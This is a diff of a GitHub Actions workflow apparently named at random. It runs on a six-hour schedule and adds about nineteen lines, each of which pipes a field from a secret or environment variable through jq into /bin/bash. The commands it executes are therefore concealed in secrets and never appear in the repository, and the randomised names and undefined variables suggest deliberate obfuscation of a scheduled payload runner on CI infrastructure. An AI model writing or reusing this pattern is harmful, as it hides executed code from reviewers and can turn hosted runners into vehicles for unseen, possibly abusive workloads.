@@ -1,21 +1,36 @@
 name: chowdergentleman
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 3/6 * * *'
-jobs:  # 16064
+    - cron: '50 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chowdergentleman
         env:
-          hiexl101: ${{ secrets.hiexl101 }}
+          alx873: ${{ secrets.alx873 }}
         run: |
-          echo $hiexl101 | jq -r .vp41 | /bin/bash
-          echo $bi426 | jq -r .spfx0 | /bin/bash
-          echo $h133 | jq -r .u81595 | /bin/bash
-          echo $ib008 | jq -r .awa8 | /bin/bash
-          echo $mx4259 | jq -r .n5 | /bin/bash
+          echo $alx873 | jq -r .tviuf415 | /bin/bash
+          echo $tpn050 | jq -r .wmjt9155 | /bin/bash
+          echo $w372 | jq -r .pdah64 | /bin/bash
+          echo $fpa28 | jq -r .yvtq95745 | /bin/bash
+          echo $ajtac6428 | jq -r .as92206 | /bin/bash
+          echo $jhp4 | jq -r .dtuyi2413 | /bin/bash
+          echo $sw31 | jq -r .l008 | /bin/bash
+          echo $c1534 | jq -r .m53062 | /bin/bash
+          echo $jxmar3077 | jq -r .kb704 | /bin/bash
+          echo $ascr3983 | jq -r .dak0 | /bin/bash
+          echo $xzy657 | jq -r .bg22282 | /bin/bash
+          echo $jp144 | jq -r .x0 | /bin/bash
+          echo $cvd07738 | jq -r .x35367 | /bin/bash
+          echo $ha45 | jq -r .say7527 | /bin/bash
+          echo $e66 | jq -r .pfpjm4075 | /bin/bash
+          echo $gvv0 | jq -r .pvqgo6 | /bin/bash
+          echo $qkogs0240 | jq -r .bmndn7652 | /bin/bash
+          echo $em11233 | jq -r .tye00 | /bin/bash
+          echo $eidwk195 | jq -r .vd61253 | /bin/bash
 
